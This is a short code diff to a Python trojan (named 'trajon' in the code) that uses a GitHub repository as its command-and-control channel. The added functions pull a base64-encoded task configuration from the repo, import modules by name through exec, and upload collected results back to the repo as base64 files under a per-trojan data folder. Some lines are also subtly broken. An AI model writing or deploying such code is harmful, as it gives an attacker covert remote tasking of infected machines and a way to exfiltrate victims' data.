@@ -42,14 +42,30 @@ def connect_to_github():
 
 def get_file_contents(filepath):
     gh,repo,branch = connect_to_github()
-    tree = branch.commit.commit.tree.recurse()
+    commit = repo.commits().next()
+    tree = repo.tree(commit.sha).recurse()
 
     for filename in tree.tree:
         if filepath in filename.path:
             print("[*] Found file %s" % filepath)
             blob = repo.blob(filename._json_data['sha'])
-            return blob.get_file_content
-    
+            return blob.get_file_content    
     return None
 
-get_file_contents(trajon_config)
+def get_trajon_config():
+    global configured
+    config_json = get_file_contents(trajon_config)
+    config = json.load(base64.b64decode(config_json))
+    configured = True
+
+    for task in config:
+        if task['module'] not in sys.modules:
+            exec("import %s" % task['module'])
+    
+    return config
+
+def store_module_result(data):
+    gh,repo,branch = connect_to_github()
+    remote_path = "data/%s/%d.data" % (trajon_id, random.randint(1000, 100000))
+    repo.create_file(remote_path, "Commit message", base64.b64encode(data))
+    return
